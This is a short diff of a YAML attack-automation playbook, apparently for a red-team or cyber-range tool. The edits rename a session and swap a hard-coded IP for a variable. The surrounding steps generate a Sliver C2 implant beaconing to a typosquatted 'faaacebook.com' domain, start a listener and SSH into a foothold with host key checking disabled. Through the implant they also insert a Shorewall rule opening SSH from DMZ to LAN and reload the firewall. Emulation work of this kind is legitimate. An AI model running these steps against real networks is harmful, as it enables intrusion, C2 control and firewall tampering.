@@ -16,7 +16,7 @@ commands:
   - type: sliver
     cmd: "generate_implant"
     c2url: "https://faaacebook.com"
-    name: "super-sliver1"
+    name: "sliver1"
 
   - type: sliver
     cmd: start_https_listener
@@ -36,7 +36,7 @@ commands:
 
   - type: ssh
     session: foothold
-    cmd: "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@172.17.100.254\n"
+    cmd: "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@$FIREWALL_ADDRESS\n"
     interactive: True
   
   - type: sleep
@@ -175,7 +175,7 @@ commands:
       - -i 
       - '/# Kafka Ports/i\ACCEPT dmz lan:$LINUXSHARE tcp  22  -   -   -' 
       - /etc/shorewall/rules
-    session: super-sliver1
+    session: sliver1
 
 
   - type: sliver-session
@@ -183,7 +183,7 @@ commands:
     exe: shorewall
     args:
       - reload
-    session: super-sliver1
+    session: sliver1
 
   - type: ssh
     creates_session: "foothold2"
